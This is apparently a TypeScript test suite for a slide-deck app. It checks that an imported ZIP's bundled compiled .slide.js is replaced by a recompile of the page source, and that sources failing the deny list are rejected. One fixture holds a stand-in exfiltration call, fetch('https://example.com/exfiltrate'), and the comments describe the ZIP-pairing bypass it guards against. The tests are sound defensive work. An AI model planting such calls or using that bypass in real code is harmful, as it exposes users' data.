import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import crypto from 'node:crypto';
import { buildApp } from '../src/server';
import { db } from '../src/db';
import { config } from '../src/config';
import { setSystemAuthSettings } from '../src/services/aiSettings';
import { pageReactSlideCompiledPath, pageReactSlideSourcePath } from '../src/services/storage';
import { recompileImportedReactSlides } from '../src/services/reactSlidePage';

/**
 * An imported React page must run its own source, never the `.slide.js` that came in the ZIP.
 *
 * Export packs both files, import copies the whole directory, and the read route only compiles
 * when the compiled file is *missing* — so before this, a hand-built ZIP could pair an innocuous
 * `.slide.jsx` with a `.slide.js` that was something else entirely, and the sandbox would run the
 * latter. The deny list applied when code is saved never sees that path.
 */

function testSessionCookie(sub = 'import-recompile-owner'): string {
  const payload = Buffer.from(
    JSON.stringify({ provider: 'google', sub, email: `${sub}@example.com` }),
    'utf8',
  ).toString('base64url');
  const signature = crypto.createHmac('sha256', config.authSessionSecret).update(payload).digest('base64url');
  return `${payload}.${signature}`;
}

const HEADERS = {
  cookie: `makeslide_session=${encodeURIComponent(testSessionCookie())}`,
  'content-type': 'application/json',
};

setSystemAuthSettings({ googleAuthEnabled: false });

const SLIDE_CODE = `function Slide() {
  return <div style={{ width: '100%', height: '100%' }}><h1>匯入測試</h1></div>;
}
window.SlideComponent = Slide;
`;

/** What a malicious ZIP would carry as `.slide.js`: valid JS, unrelated to the source beside it. */
const TAMPERED_COMPILED = `window.SlideComponent = function () {
  return React.createElement('h1', null, 'TAMPERED');
};
`;

function pageUidOf(pdfId: string, pageNumber: number): string {
  const row = db
    .prepare(`SELECT page_uid FROM pages WHERE pdf_id = ? AND page_number = ?`)
    .get(pdfId, pageNumber) as { page_uid: string };
  return row.page_uid;
}

/** A deck with one saved React page, standing in for what an import has just copied into place. */
async function deckWithReactPage(
  app: Awaited<ReturnType<typeof buildApp>>,
  code = SLIDE_CODE,
): Promise<{ pdfId: string; pageUid: string }> {
  const created = await app.inject({
    method: 'POST',
    url: '/api/pdfs/blank',
    headers: HEADERS,
    payload: { title: '匯入測試', category: '課程' },
  });
  assert.equal(created.statusCode, 201);
  const pdfId = (created.json() as { id: string }).id;
  const saved = await app.inject({
    method: 'PUT',
    url: `/api/pdfs/${pdfId}/pages/1/react-slide`,
    headers: HEADERS,
    payload: { code },
  });
  assert.equal(saved.statusCode, 200);
  return { pdfId, pageUid: pageUidOf(pdfId, 1) };
}

test('a tampered .slide.js is replaced by the page source, not trusted', async () => {
  const app = await buildApp();
  try {
    const { pdfId, pageUid } = await deckWithReactPage(app);
    const compiledPath = pageReactSlideCompiledPath(pdfId, pageUid);
    const legitimate = fs.readFileSync(compiledPath, 'utf8');

    // Stand in for the ZIP: the compiled file says one thing, the source beside it says another.
    fs.writeFileSync(compiledPath, TAMPERED_COMPILED, 'utf8');

    const result = await recompileImportedReactSlides(pdfId, [1]);

    assert.deepEqual(result.recompiled, [1]);
    assert.deepEqual(result.rejected, []);
    const after = fs.readFileSync(compiledPath, 'utf8');
    assert.ok(!after.includes('TAMPERED'), 'the ZIP\'s compiled output must not survive the import');
    assert.equal(after, legitimate, 'the page must run what its own source compiles to');
  } finally {
    await app.close();
  }
});

test('a source that fails the deny list leaves no compiled file behind', async () => {
  const app = await buildApp();
  try {
    const { pdfId, pageUid } = await deckWithReactPage(app);
    const compiledPath = pageReactSlideCompiledPath(pdfId, pageUid);

    // Both halves are what a hostile ZIP would carry: a source that would never have passed the
    // save-time deny list, and a compiled file ready to run regardless.
    fs.writeFileSync(
      pageReactSlideSourcePath(pdfId, pageUid),
      `function Slide() { fetch('https://example.com/exfiltrate'); return null; }\nwindow.SlideComponent = Slide;\n`,
      'utf8',
    );
    fs.writeFileSync(compiledPath, TAMPERED_COMPILED, 'utf8');

    const result = await recompileImportedReactSlides(pdfId, [1]);

    assert.deepEqual(result.rejected, [1]);
    assert.deepEqual(result.recompiled, []);
    // Deleted rather than left in place: leaving it is the whole bug. The page keeps its source
    // and its JPG, so it can be repaired and still shows something meanwhile.
    assert.ok(!fs.existsSync(compiledPath), 'an unvalidated compiled file must be removed, not kept');
  } finally {
    await app.close();
  }
});

test('a page whose source will not compile is rejected, and one good page still imports', async () => {
  const app = await buildApp();
  try {
    const { pdfId, pageUid } = await deckWithReactPage(app);
    fs.writeFileSync(pageReactSlideSourcePath(pdfId, pageUid), 'function Slide( {{{ broken', 'utf8');
    fs.writeFileSync(pageReactSlideCompiledPath(pdfId, pageUid), TAMPERED_COMPILED, 'utf8');

    const result = await recompileImportedReactSlides(pdfId, [1]);
    assert.deepEqual(result.rejected, [1]);
    assert.ok(!fs.existsSync(pageReactSlideCompiledPath(pdfId, pageUid)));

    // A page number with no row (a sidecar naming a page the deck does not have) is skipped
    // rather than throwing, so one bad entry cannot fail the whole import.
    const skipped = await recompileImportedReactSlides(pdfId, [999]);
    assert.deepEqual(skipped, { recompiled: [], rejected: [] });
  } finally {
    await app.close();
  }
});
